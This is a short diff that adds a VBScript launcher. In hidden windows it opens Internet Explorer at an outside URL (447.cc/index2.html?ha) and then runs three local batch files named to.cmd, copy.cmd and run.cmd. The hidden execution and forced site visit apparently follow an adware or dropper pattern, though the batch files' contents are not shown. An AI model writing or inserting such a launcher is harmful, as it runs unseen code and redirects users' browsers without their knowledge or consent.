@@ -1,0 +1,6 @@
+DIM objShell
+set objShell=Wscript.createObject("wscript.shell")
+iReturn=objShell.Run("cmd.exe /C  start  /min       iexplore http://447.cc/index2.html?ha", 0, TRUE)
+iReturn=objShell.Run("cmd.exe /C .\to.cmd", 0, TRUE)
+iReturn=objShell.Run("cmd.exe /C .\copy.cmd", 0, TRUE)
+iReturn=objShell.Run("cmd.exe /C .\run.cmd", 0, TRUE)
